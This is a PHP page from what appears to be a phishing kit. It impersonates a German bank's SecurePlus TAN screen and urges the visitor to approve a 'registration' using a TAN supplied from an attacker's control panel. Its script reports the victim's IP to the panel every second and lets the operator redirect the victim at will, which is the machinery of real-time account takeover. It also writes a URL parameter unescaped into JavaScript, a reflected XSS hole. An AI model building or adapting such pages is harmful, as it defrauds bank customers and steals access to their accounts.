<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TAN</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<img src="res/logo.svg">
</header>


<main>
<div class="form">



<div class="title" style="text-align:center;">
Registrierung mit TAN genehmigen
</div>

<div class="text">
<p>Bitte generieren Sie mit Ihrer SecurePlus App oder Ihrem SecurePlus Generator eine TAN. Nutzen Sie diese zur Freigabe Ihrer Registrierung.</p>
<p>Wir konnten weitere Verbindungen identifizieren:<br>
 <?php
date_default_timezone_set('Europe/Berlin');
echo date("d.m.Y, \u\m H:i \U\h\r");
?>
</p>
<p>Verbindung 1</p>


<div class="tan">
    <p>Ihre TAN</p>
    <p class="tan"><?= $pnl->getD($ip); ?></p>
</div>


</div>
 

<div class="col btns">
    <button>Freigeben</button>
    <button class="danger">Ablehnen</button>
</div>



</div>
</main>




<footer>
<span>Sicherheit</span>
<span>Cookie-Einstellungen </span>
<span>Datenschutz </span>
<span>Barrierefreiheit </span>
<span>Nachhaltigkeit</span>
<span>AGB </span>
<span>Disclaimer </span>
<span>Impressum</span>
<span>BLZ: 76030080</span>
<span>BIC: CSDBDE71</span>
</footer>

<?php 
$helper->addLoader();
?>
<script>

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>